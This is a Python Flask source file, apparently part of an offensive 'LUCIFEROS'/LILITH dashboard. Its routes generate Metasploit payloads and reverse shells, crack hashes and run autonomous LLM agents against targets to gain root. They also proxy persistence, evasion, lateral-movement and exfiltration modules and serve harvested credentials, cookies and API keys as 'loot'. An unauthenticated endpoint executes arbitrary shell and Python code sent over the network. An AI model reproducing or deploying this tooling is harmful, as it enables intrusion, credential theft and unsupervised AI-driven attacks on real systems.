@app.route('/_dash/network/capture/status', methods=['GET'])
def network_capture_status():
    """Get capture status"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_packet_capture
        
        capture = get_packet_capture()
        result = capture.get_results()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/arp/scan', methods=['POST'])
def arp_scan():
    """Scan network using ARP"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_arp_scanner
        
        data = request.json or {}
        ip_range = data.get('range', '192.168.1.0/24')
        
        scanner = get_arp_scanner()
        result = scanner.scan_network(ip_range)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/hash/identify', methods=['POST'])
def identify_hash():
    """Identify hash type"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_hash_cracker
        
        data = request.json or {}
        hash_value = data.get('hash', '')
        
        if not hash_value:
            return jsonify({'success': False, 'error': 'No hash provided'})
        
        cracker = get_hash_cracker()
        result = cracker.identify_hash(hash_value)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/hash/crack', methods=['POST'])
def crack_hash():
    """Crack hash"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_hash_cracker
        
        data = request.json or {}
        hash_value = data.get('hash', '')
        hash_type = data.get('type', 0)
        wordlist = data.get('wordlist', None)
        
        if not hash_value:
            return jsonify({'success': False, 'error': 'No hash provided'})
        
        cracker = get_hash_cracker()
        result = cracker.crack_hash(hash_value, mode=hash_type, wordlist=wordlist)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/metasploit/exploits', methods=['GET'])
def get_exploits():
    """Get Metasploit exploits - Enhanced"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_metasploit
        
        search = request.args.get('search', None)
        platform = request.args.get('platform', None)
        
        msf = get_metasploit()
        result = msf.search_exploits(query=search, platform=platform)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/metasploit/payloads', methods=['POST'])
def generate_payload():
    """Generate Metasploit payload - Enhanced"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_metasploit
        
        data = request.json or {}
        payload_type = data.get('type', 'reverse_tcp')
        platform = data.get('platform', 'bash')
        lhost = data.get('lhost', '127.0.0.1')
        lport = data.get('lport', 4444)
        encode = data.get('encode', False)
        
        msf = get_metasploit()
        result = msf.generate_payload(payload_type, lhost, lport, platform=platform, encode=encode)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/metasploit/all-shells', methods=['POST'])
def generate_all_shells():
    """Generate all reverse shell types"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_metasploit
        
        data = request.json or {}
        lhost = data.get('lhost', '127.0.0.1')
        lport = data.get('lport', 4444)
        
        msf = get_metasploit()
        result = msf.generate_all_shells(lhost, lport)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/metasploit/exploit-info', methods=['GET'])
def get_exploit_info():
    """Get exploit details"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_metasploit
        
        exploit_name = request.args.get('name', '')
        
        if not exploit_name:
            return jsonify({'success': False, 'error': 'No exploit name provided'})
        
        msf = get_metasploit()
        result = msf.get_exploit_info(exploit_name)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== COMMAND INJECTOR ROUTES ==========

@app.route('/_dash/injector/execute', methods=['POST'])
def execute_injection():
    """Execute injected code"""
    import subprocess
    import tempfile
    
    data = request.json or {}
    code = data.get('code', '')
    code_type = data.get('type', 'bash')
    
    if not code:
        return jsonify({'success': False, 'error': 'No code provided'})
    
    try:
        if code_type in ['bash', 'cmd']:
            # Execute bash/shell command
            result = subprocess.run(
                code,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return jsonify({
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'return_code': result.returncode
            })
        
        elif code_type == 'python':
            # Execute Python code
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(code)
                f.flush()
                result = subprocess.run(
                    ['python3', f.name],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                os.unlink(f.name)
                return jsonify({
                    'success': result.returncode == 0,
                    'output': result.stdout + result.stderr,
                    'return_code': result.returncode
                })
        
        elif code_type == 'powershell':
            # Just return the encoded version for Windows targets
            import base64
            encoded = base64.b64encode(code.encode('utf-16le')).decode()
            return jsonify({
                'success': True,
                'output': f'PowerShell command ready:\npowershell -enc {encoded}',
                'encoded': encoded
            })
        
        elif code_type in ['sql', 'xss']:
            # These are payloads to be used elsewhere, just validate
            return jsonify({
                'success': True,
                'output': f'{code_type.upper()} payload ready for injection.\nLength: {len(code)} chars',
                'payload': code
            })
        
        else:
            return jsonify({'success': False, 'error': f'Unknown type: {code_type}'})
    
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'Execution timed out (30s limit)'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/injector/test', methods=['POST'])
def test_injection():
    """Test injection syntax"""
    import subprocess
    
    data = request.json or {}
    code = data.get('code', '')
    code_type = data.get('type', 'bash')
    
    if not code:
        return jsonify({'valid': False, 'error': 'No code provided'})
    
    try:
        if code_type in ['bash', 'cmd']:
            # Check bash syntax
            result = subprocess.run(
                ['bash', '-n', '-c', code],
                capture_output=True,
                text=True,
                timeout=5
            )
            return jsonify({
                'valid': result.returncode == 0,
                'message': 'Bash syntax valid' if result.returncode == 0 else result.stderr
            })
        
        elif code_type == 'python':
            # Check Python syntax
            try:
                compile(code, '<string>', 'exec')
                return jsonify({'valid': True, 'message': 'Python syntax valid'})
            except SyntaxError as e:
                return jsonify({'valid': False, 'error': f'Line {e.lineno}: {e.msg}'})
        
        elif code_type in ['sql', 'xss', 'powershell']:
            # Basic validation
            return jsonify({
                'valid': len(code) > 0,
                'message': f'{code_type.upper()} payload looks valid ({len(code)} chars)'
            })
        
        return jsonify({'valid': True, 'message': 'Syntax check passed'})
    
    except Exception as e:
        return jsonify({'valid': False, 'error': str(e)})

@app.route('/_dash/network/capture/stop', methods=['POST'])
def stop_network_capture():
    """Stop packet capture"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_packet_capture
        
        capture = get_packet_capture()
        result = capture.stop_capture()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/capture/analyze', methods=['POST'])
def analyze_pcap():
    """Analyze PCAP file"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_packet_capture
        
        data = request.json or {}
        pcap_file = data.get('file', '')
        
        if not pcap_file:
            return jsonify({'success': False, 'error': 'No PCAP file specified'})
        
        capture = get_packet_capture()
        result = capture.analyze_pcap(pcap_file)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/interfaces', methods=['GET'])
def list_network_interfaces():
    """List network interfaces"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_packet_capture
        
        capture = get_packet_capture()
        result = capture.list_interfaces()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/network/arp/spoof-detect', methods=['POST'])
def detect_arp_spoofing():
    """Detect ARP spoofing"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_arp_scanner
        
        data = request.json or {}
        gateway_ip = data.get('gateway', '192.168.1.1')
        monitor_time = data.get('time', 30)
        
        scanner = get_arp_scanner()
        result = scanner.detect_arp_spoofing(gateway_ip, monitor_time)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== PROXY ROTATION ROUTES ==========

@app.route('/_dash/proxy/fetch', methods=['POST'])
def fetch_proxies():
    """Fetch fresh proxies from online sources"""
    try:
        sys.path.insert(0, '/app/tools')
        from proxy_rotator import get_proxy_rotator
        
        data = request.json or {}
        proxy_type = data.get('type', 'http')
        
        rotator = get_proxy_rotator()
        result = rotator.fetch_proxies(proxy_type)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/proxy/test', methods=['POST'])
def test_proxies():
    """Test proxies for functionality"""
    try:
        sys.path.insert(0, '/app/tools')
        from proxy_rotator import get_proxy_rotator
        
        data = request.json or {}
        proxy_type = data.get('type', 'http')
        limit = data.get('limit', 20)
        
        rotator = get_proxy_rotator()
        result = rotator.test_proxies(proxy_type, limit=limit)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/proxy/get', methods=['GET'])
def get_proxy():
    """Get a working proxy"""
    try:
        sys.path.insert(0, '/app/tools')
        from proxy_rotator import get_proxy_rotator
        
        proxy_type = request.args.get('type', 'http')
        
        rotator = get_proxy_rotator()
        result = rotator.get_proxy(proxy_type)
        
        return jsonify({'success': True, 'proxy': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/proxy/stats', methods=['GET'])
def proxy_stats():
    """Get proxy statistics"""
    try:
        sys.path.insert(0, '/app/tools')
        from proxy_rotator import get_proxy_rotator
        
        rotator = get_proxy_rotator()
        result = rotator.get_stats()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/proxy/add', methods=['POST'])
def add_proxies():
    """Add proxies to the pool"""
    try:
        sys.path.insert(0, '/app/tools')
        from proxy_rotator import get_proxy_rotator
        
        data = request.json or {}
        proxies = data.get('proxies', [])
        proxy_type = data.get('type', 'http')
        
        rotator = get_proxy_rotator()
        result = rotator.add_proxies_bulk(proxies, proxy_type)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== LILITH MEMORY ROUTES ==========

@app.route('/_dash/memory/stats', methods=['GET'])
def memory_stats():
    """Get memory statistics"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_memory import get_lilith_memory
        
        memory = get_lilith_memory()
        result = memory.get_stats()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/memory/exploits', methods=['GET'])
def get_memory_exploits():
    """Get saved exploits from memory"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_memory import get_lilith_memory
        
        memory = get_lilith_memory()
        query = request.args.get('query', '')
        
        if query:
            exploits = memory.search_exploits(query)
        else:
            exploits = memory.get_top_exploits(20)
        
        return jsonify({'success': True, 'exploits': exploits})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/memory/payloads', methods=['GET'])
def get_memory_payloads():
    """Get saved payloads from memory"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_memory import get_lilith_memory
        
        memory = get_lilith_memory()
        platform = request.args.get('platform')
        
        payloads = memory.get_payloads(platform=platform)
        
        return jsonify({'success': True, 'payloads': payloads})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/memory/export', methods=['GET'])
def export_memory():
    """Export knowledge base"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_memory import get_lilith_memory
        
        memory = get_lilith_memory()
        result = memory.export_knowledge()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/memory/save-exploit', methods=['POST'])
def save_exploit_to_memory():
    """Manually save an exploit"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_memory import get_lilith_memory
        
        data = request.json or {}
        memory = get_lilith_memory()
        
        result = memory.save_exploit(
            name=data.get('name', 'Manual Exploit'),
            code=data.get('code', ''),
            category=data.get('category', 'general'),
            target_type=data.get('target_type'),
            cve=data.get('cve'),
            description=data.get('description'),
            tags=data.get('tags', [])
        )
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== SHREK PAYLOAD GENERATOR ROUTES ==========

@app.route('/_dash/shrek/shells', methods=['POST'])
def shrek_get_shells():
    """Get all reverse shells from Shrek generator"""
    try:
        sys.path.insert(0, '/app/tools')
        from shrek_payloads import ShrekPayloadGenerator
        
        data = request.json or {}
        lhost = data.get('lhost', '127.0.0.1')
        lport = data.get('lport', 4444)
        
        shells = ShrekPayloadGenerator.get_all_shells(lhost, lport)
        
        return jsonify({
            'success': True,
            'lhost': lhost,
            'lport': lport,
            'shells': shells,
            'listener': f'nc -lvnp {lport}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/shrek/by-category', methods=['POST'])
def shrek_by_category():
    """Get shells organized by category"""
    try:
        sys.path.insert(0, '/app/tools')
        from shrek_payloads import ShrekPayloadGenerator
        
        data = request.json or {}
        lhost = data.get('lhost', '127.0.0.1')
        lport = data.get('lport', 4444)
        
        shells = ShrekPayloadGenerator.get_by_category(lhost, lport)
        
        return jsonify({
            'success': True,
            'categories': shells
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== TELEGRAM BOT STATUS ==========

@app.route('/_dash/telegram/status', methods=['GET'])
def telegram_status():
    """Get Telegram bot status"""
    try:
        token = os.environ.get('TELEGRAM_BOT_TOKEN')
        
        return jsonify({
            'success': True,
            'configured': bool(token),
            'token_set': token is not None,
            'instructions': 'Set TELEGRAM_BOT_TOKEN env variable to activate'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/telegram/set-token', methods=['POST'])
def set_telegram_token():
    """Set Telegram bot token"""
    try:
        data = request.json or {}
        token = data.get('token', '')
        
        if token:
            os.environ['TELEGRAM_BOT_TOKEN'] = token
            return jsonify({
                'success': True,
                'message': 'Token set. Restart bot to activate.'
            })
        return jsonify({'success': False, 'error': 'No token provided'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== AUTONOMOUS AGENT ROUTES ====================

@app.route('/_dash/autonomous/hackbuddy', methods=['POST'])
def run_hackbuddy_route():
    """Run HackingBuddyGPT autonomous attack"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_autonomous_agent import HackingBuddyAgent
        
        data = request.json or {}
        target = data.get('target', '')
        goal = data.get('goal', 'Gain root access')
        attack_type = data.get('attack_type', 'linux_privesc')
        max_rounds = min(data.get('max_rounds', 5), 10)  # Cap at 10 rounds
        
        if not target:
            return jsonify({'success': False, 'error': 'No target specified'})
        
        agent = HackingBuddyAgent(target, goal, attack_type, max_rounds)
        
        rounds_data = []
        for i in range(max_rounds):
            round_result = agent.perform_round()
            rounds_data.append({
                'number': round_result.number,
                'thought': round_result.thought[:500],
                'command': round_result.command,
                'output': round_result.output[:1500],
                'success': round_result.success,
                'goal_achieved': round_result.goal_achieved
            })
            if round_result.goal_achieved:
                break
            import time
            time.sleep(1)  # Rate limiting between rounds
        
        return jsonify({
            'success': True,
            'target': target,
            'goal': goal,
            'attack_type': attack_type,
            'attack_types_available': list(agent.ATTACK_TYPES.keys()),
            'rounds': rounds_data,
            'completed': agent.state.value,
            'goal_achieved': any(r['goal_achieved'] for r in rounds_data)
        })
    except Exception as e:
        import traceback
        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})

@app.route('/_dash/autonomous/garak', methods=['POST'])
def run_garak_route():
    """Run Garak LLM vulnerability scan"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_autonomous_agent import GarakScanner
        
        data = request.json or {}
        probe = data.get('probe', 'all')
        
        scanner = GarakScanner()
        
        if probe == 'all':
            result = scanner.run_all_probes()
        else:
            probe_result = scanner.run_probe(probe)
            result = {'results': [probe_result]}
        
        return jsonify({'success': True, **result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/autonomous/kawaii', methods=['POST'])
def run_kawaii_route():
    """Chat with KawaiiGPT"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_autonomous_agent import KawaiiGPT
        
        data = request.json or {}
        message = data.get('message', '')
        
        if not message:
            return jsonify({'success': False, 'error': 'No message provided'})
        
        kawaii = KawaiiGPT()
        result = kawaii.chat(message)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/autonomous/autogpt', methods=['POST'])
def run_autogpt_route():
    """Run AutoGPT agent"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_autonomous_agent import AutoHackAgent
        
        data = request.json or {}
        goal = data.get('goal', '')
        max_iterations = min(data.get('max_iterations', 5), 10)  # Cap at 10
        
        if not goal:
            return jsonify({'success': False, 'error': 'No goal specified'})
        
        agent = AutoHackAgent(goal, max_iterations)
        
        iterations_data = []
        for i in range(max_iterations):
            result = agent.think_and_act()
            iterations_data.append({
                'iteration': result['iteration'],
                'thinking': result.get('thinking', '')[:300],
                'plan': result.get('plan', '')[:200],
                'tool': result['tool'],
                'args': result['args'],
                'result': result['result'][:500],
                'progress': result.get('progress', 0)
            })
            if result.get('complete'):
                break
            import time
            time.sleep(1)  # Rate limiting
        
        return jsonify({
            'success': True,
            'goal': goal,
            'iterations': len(iterations_data),
            'complete': agent.state.value == 'completed',
            'iterations_data': iterations_data,
            'short_term_memory': [{'action': m['action'], 'result': m['result'][:200]} for m in agent.short_term_memory[-5:]],
            'long_term_memory': agent.long_term_memory,
            'tools_available': list(agent.TOOLS.keys())
        })
    except Exception as e:
        import traceback
        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})

@app.route('/_dash/autonomous/crew', methods=['POST'])
def run_crew_route():
    """Run CrewAI multi-agent attack"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_autonomous_agent import HackingCrew
        
        data = request.json or {}
        target = data.get('target', '')
        objective = data.get('objective', '')
        agents = data.get('agents', None)
        
        if not target or not objective:
            return jsonify({'success': False, 'error': 'Target and objective required'})
        
        crew = HackingCrew(target, objective, agents)
        result = crew.run_operation()
        
        return jsonify({'success': True, **result})
    except Exception as e:
        import traceback
        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})


# ==================== SHREK PAYLOAD ROUTES ====================

@app.route('/_dash/shrek/shells', methods=['POST'])
def dash_shrek_shells():
    """Get all Shrek shells"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from shrek_payloads import ShrekPayloadGenerator
        
        data = request.json or {}
        lhost = data.get('lhost', '10.10.10.10')
        lport = int(data.get('lport', 4444))
        
        shells = ShrekPayloadGenerator.get_all_shells(lhost, lport)
        
        return jsonify({
            'success': True,
            'lhost': lhost,
            'lport': lport,
            'shells': shells,
            'count': len(shells)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/shrek/shell/<shell_type>', methods=['POST'])
def dash_shrek_shell(shell_type: str):
    """Get specific shell type"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from shrek_payloads import ShrekPayloadGenerator
        
        data = request.json or {}
        lhost = data.get('lhost', '10.10.10.10')
        lport = int(data.get('lport', 4444))
        
        shell_methods = {
            'bash_tcp': ShrekPayloadGenerator.bash_tcp,
            'bash_udp': ShrekPayloadGenerator.bash_udp,
            'nc_traditional': ShrekPayloadGenerator.nc_traditional,
            'nc_openbsd': ShrekPayloadGenerator.nc_openbsd,
            'python_pty': ShrekPayloadGenerator.python_pty,
            'python_full': ShrekPayloadGenerator.python_full,
            'php_full': ShrekPayloadGenerator.php_full,
            'ruby': ShrekPayloadGenerator.ruby,
            'perl': ShrekPayloadGenerator.perl,
            'java': ShrekPayloadGenerator.java,
            'powershell': ShrekPayloadGenerator.powershell,
            'socat': ShrekPayloadGenerator.socat,
            'msfvenom_windows': ShrekPayloadGenerator.msfvenom_windows_exe,
            'msfvenom_linux': ShrekPayloadGenerator.msfvenom_linux_elf,
            'msfvenom_android': ShrekPayloadGenerator.msfvenom_android_apk,
        }
        
        if shell_type not in shell_methods:
            return jsonify({
                'success': False,
                'error': f'Unknown shell type: {shell_type}',
                'available_types': list(shell_methods.keys())
            })
        
        payload = shell_methods[shell_type](lhost, lport)
        
        return jsonify({
            'success': True,
            'shell_type': shell_type,
            'lhost': lhost,
            'lport': lport,
            'payload': payload
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== ATTACK HISTORY ROUTES ====================

@app.route('/_dash/history/statistics', methods=['GET'])
def dash_history_statistics():
    """Get attack statistics"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_attack_logger import get_attack_logger
        
        logger = get_attack_logger()
        stats = logger.get_statistics()
        
        return jsonify({
            'success': True,
            'statistics': stats
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/history/attacks', methods=['GET'])
def dash_history_attacks():
    """Get attack history"""
    try:
        import sys
        sys.path.insert(0, '/app/tools')
        from lilith_attack_logger import get_attack_logger
        
        logger = get_attack_logger()
        limit = int(request.args.get('limit', 20))
        attack_type = request.args.get('type')
        
        if attack_type and attack_type != 'all':
            attacks = logger.get_attacks_by_type(attack_type, limit)
        else:
            attacks = logger.get_recent_attacks(limit)
        
        return jsonify({
            'success': True,
            'attacks': attacks,
            'count': len(attacks)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== ADVANCED ATTACK MODULE PROXY ROUTES ====================
# Proxy routes for /advanced/* endpoints to lilith_full_backend.py on port 5000

@app.route('/_dash/advanced/persistence', methods=['POST'])
def dash_advanced_persistence():
    """Proxy to advanced persistence techniques"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/persistence", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/persistence/<technique>', methods=['POST'])
def dash_advanced_persistence_specific(technique):
    """Proxy to specific persistence technique"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/persistence/{technique}", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/evasion', methods=['GET'])
def dash_advanced_evasion():
    """Proxy to advanced evasion techniques"""
    try:
        resp = requests.get(f"{BACKEND_URL}/advanced/evasion", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/evasion/<technique>', methods=['GET'])
def dash_advanced_evasion_specific(technique):
    """Proxy to specific evasion technique"""
    try:
        resp = requests.get(f"{BACKEND_URL}/advanced/evasion/{technique}", timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/lateral', methods=['POST'])
def dash_advanced_lateral():
    """Proxy to advanced lateral movement techniques"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/lateral", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/lateral/<technique>', methods=['POST'])
def dash_advanced_lateral_specific(technique):
    """Proxy to specific lateral movement technique"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/lateral/{technique}", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/exfil', methods=['POST'])
def dash_advanced_exfil():
    """Proxy to advanced exfiltration techniques"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/exfil", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/advanced/exfil/<technique>', methods=['POST'])
def dash_advanced_exfil_specific(technique):
    """Proxy to specific exfiltration technique"""
    try:
        resp = requests.post(f"{BACKEND_URL}/advanced/exfil/{technique}", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== LOOT STORAGE ROUTES ====================

@app.route('/_dash/loot/credentials', methods=['GET'])
def dash_loot_credentials():
    """Get harvested credentials from LILITH's memory"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/credentials", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/loot/cookies', methods=['GET'])
def dash_loot_cookies():
    """Get harvested cookies"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/cookies", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/loot/hashes', methods=['GET'])
def dash_loot_hashes():
    """Get password hashes"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/hashes", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/loot/keys', methods=['GET'])
def dash_loot_keys():
    """Get API keys and secrets"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/keys", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/loot/stats', methods=['GET'])
def dash_loot_stats():
    """Get loot statistics"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/stats", timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/loot/summary', methods=['GET'])
def dash_loot_summary():
    """Get full loot summary"""
    try:
        resp = requests.get(f"{BACKEND_URL}/loot/summary", timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== SCRIPT STORAGE ROUTES ====================

@app.route('/_dash/scripts', methods=['GET'])
def dash_get_scripts():
    """Get saved scripts from LILITH's memory"""
    try:
        resp = requests.get(f"{BACKEND_URL}/scripts", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/scripts', methods=['POST'])
def dash_store_script():
    """Store a script in LILITH's memory"""
    try:
        resp = requests.post(f"{BACKEND_URL}/scripts", json=request.json, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/scripts/<name>', methods=['GET'])
def dash_get_script(name):
    """Get a specific script"""
    try:
        resp = requests.get(f"{BACKEND_URL}/scripts/{name}", timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/scripts/<name>', methods=['DELETE'])
def dash_delete_script(name):
    """Delete a script from memory"""
    try:
        resp = requests.delete(f"{BACKEND_URL}/scripts/{name}", timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== REAL AUTONOMOUS AGENTS ====================

@app.route('/_dash/agents/hackbuddy/real', methods=['POST'])
def dash_real_hackbuddy():
    """Run REAL HackingBuddy attack"""
    try:
        resp = requests.post(f"{BACKEND_URL}/agents/hackbuddy/real", json=request.json, timeout=300)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/agents/autogpt/real', methods=['POST'])
def dash_real_autogpt():
    """Run REAL AutoGPT attack"""
    try:
        resp = requests.post(f"{BACKEND_URL}/agents/autogpt/real", json=request.json, timeout=300)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== DARK CODE GENERATOR ====================

@app.route('/_dash/codegen/generate', methods=['POST'])
def dash_codegen():
    """Generate code using dark AI"""
    try:
        resp = requests.post(f"{BACKEND_URL}/codegen/generate", json=request.json, timeout=120)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/codegen/reverse-shell', methods=['POST'])
def dash_codegen_revshell():
    """Generate reverse shell"""
    try:
        resp = requests.post(f"{BACKEND_URL}/codegen/reverse-shell", json=request.json, timeout=120)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/codegen/exploit', methods=['POST'])
def dash_codegen_exploit():
    """Generate exploit"""
    try:
        resp = requests.post(f"{BACKEND_URL}/codegen/exploit", json=request.json, timeout=120)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/codegen/hypothesize', methods=['POST'])
def dash_codegen_hypothesize():
    """Hypothesize attack vectors"""
    try:
        resp = requests.post(f"{BACKEND_URL}/codegen/hypothesize", json=request.json, timeout=120)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==================== TELEMETRY ====================

@app.route('/_dash/telemetry', methods=['GET'])
def dash_telemetry():
    """Get attack telemetry"""
    try:
        resp = requests.get(f"{BACKEND_URL}/telemetry", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/_dash/attack-results', methods=['GET'])
def dash_attack_results():
    """Get attack results"""
    try:
        resp = requests.get(f"{BACKEND_URL}/attack-results", params=request.args, timeout=30)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


if __name__ == "__main__":
    port = int(os.environ.get("WEB_DASHBOARD_PORT", "3000"))
    host = os.environ.get("WEB_DASHBOARD_HOST", "0.0.0.0")
    print(f"Starting LUCIFEROS Master Dashboard on http://{host}:{port}/")
    try:
        app.run(host=host, port=port, debug=False, threaded=True)
    except Exception as exc:
        print("Failed to start dashboard:", exc)
